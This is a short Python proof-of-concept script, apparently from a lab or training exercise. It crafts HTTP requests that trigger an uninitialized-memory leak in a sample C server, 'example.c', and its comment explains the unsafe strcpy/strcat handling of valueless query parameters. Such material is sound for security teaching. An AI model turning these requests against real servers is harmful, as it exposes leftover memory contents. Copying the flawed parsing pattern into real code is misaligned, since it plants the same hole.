
from pwn import * 

'''
If no VALUE is put for a query parameter, then the length is set to 0.
However, 'example.c' does NOT use this length for the query parameters. 
Instead, it uses the standard 'string' functions, such as 'strcat', 'strncpy'
and others. 

As a result, if there is data leftover, the following code in 'example.c'
leads to an uninitialized memory vulnerability: 

```
data_size = strlen(begin_request->query_params[index]->name) + strlen(begin_request->query_params[index]->value) + 2; 
data_pointer = malloc(data_size);
strcpy(data_pointer, begin_request->query_params[index]->name);
strcat(data_pointer, "=");
strcat(data_pointer, begin_request->query_params[index]->value); // Bad copy here
```
'''
# Line one
string = "GET /echo?req_type=query&key=MyQuery&res_type=body&MyQuery HTTP/1.1\r\n"

# Headers
string += "AAAAAAA:BBBBBBBB\r\n"
string += "Connection:BB\r\n"
string += "\r\n"

print(string, end='')  

# Line one
string = "GET /echo?req_type=query&key=MyQuery&res_type=body&MyQuery HTTP/1.1\r\n"

# Headers
string += "AAAAAAA:BBBBBBBB\r\n"
string += "\r\n"
print(string, end='')  
